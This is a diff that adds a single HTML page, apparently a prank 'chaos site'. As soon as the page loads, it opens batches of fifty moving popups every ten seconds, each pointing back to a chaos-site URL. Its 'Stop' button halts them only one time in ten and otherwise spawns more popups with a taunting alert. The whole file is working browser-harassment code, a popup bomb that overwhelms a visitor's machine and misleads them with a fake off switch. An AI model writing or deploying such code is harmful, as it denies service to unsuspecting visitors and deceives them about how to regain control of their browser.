@@ -1,0 +1,150 @@
+New try
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title></title>
+  <style>
+    body {
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f0f0f0;
+    }
+    #stopBtn {
+      padding: 10px 20px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button id="stopBtn">Stop</button>
+
+  <script>
+    let intervalId = null;
+    let popups = [];
+    let popupMovers = [];
+
+    const popupWidth = 200;
+    const popupHeight = 200;
+    const targetUrl = 'https://the-vision843.github.io/Chaos-site-Tarald---Test./';
+
+    function openTabs(count = 50) {
+      const screenWidth = window.screen.availWidth;
+      const screenHeight = window.screen.availHeight;
+
+      const stopBtn = document.getElementById('stopBtn');
+      const stopRect = stopBtn.getBoundingClientRect();
+
+      const avoidX = window.screenX + stopRect.left;
+      const avoidY = window.screenY + stopRect.top;
+      const avoidWidth = stopRect.width;
+      const avoidHeight = stopRect.height;
+
+      for (let i = 0; i < count; i++) {
+        let x, y;
+        let tries = 0;
+        do {
+          x = Math.floor(Math.random() * (screenWidth - popupWidth));
+          y = Math.floor(Math.random() * (screenHeight - popupHeight));
+          tries++;
+          if (tries > 100) break;
+        } while (
+          x >= avoidX &&
+          x <= avoidX + avoidWidth &&
+          y >= avoidY &&
+          y <= avoidY + avoidHeight
+        );
+
+        const popup = window.open(
+          targetUrl,
+          '_blank',
+          `width=${popupWidth},height=${popupHeight},left=${x},top=${y}`
+        );
+
+        if (popup) {
+          popups.push(popup);
+
+          let dx = Math.random() < 0.5 ? 6 : -6;
+          let dy = Math.random() < 0.5 ? 6 : -6;
+
+          const moveInterval = setInterval(() => {
+            try {
+              if (popup.closed) {
+                clearInterval(moveInterval);
+                return;
+              }
+
+              x += dx;
+              y += dy;
+
+              if (x <= 0 || x >= screenWidth - popupWidth) dx *= -1;
+              if (y <= 0 || y >= screenHeight - popupHeight) dy *= -1;
+
+              if (
+                x >= avoidX &&
+                x <= avoidX + avoidWidth &&
+                y >= avoidY &&
+                y <= avoidY + avoidHeight
+              ) {
+                dx *= -1;
+                dy *= -1;
+                x += dx * 2;
+                y += dy * 2;
+              }
+
+              popup.moveTo(x, y);
+            } catch (e) {
+              clearInterval(moveInterval);
+            }
+          }, 20);
+
+          popupMovers.push(moveInterval);
+
+          setTimeout(() => {
+            try {
+              window.focus();
+              popup.blur();
+            } catch (e) {}
+          }, 100);
+        }
+      }
+    }
+
+    function startAutomatically() {
+      openTabs();
+      intervalId = setInterval(() => openTabs(), 10000);
+    }
+
+    document.getElementById('stopBtn').addEventListener('click', () => {
+      const chance = Math.random();
+
+      if (chance <= 0.1) {
+        if (intervalId) clearInterval(intervalId);
+        intervalId = null;
+
+        popups.forEach(p => { if (!p.closed) p.close(); });
+        popupMovers.forEach(m => clearInterval(m));
+
+        popups = [];
+        popupMovers = [];
+
+        alert('You got lucky! Popups stopped.');
+      } else {
+        alert('Nope! More popups instead 😈');
+        openTabs(10);
+      }
+    });
+
+    window.onload = startAutomatically;
+  </script>
+</body>
+</html>
+
+
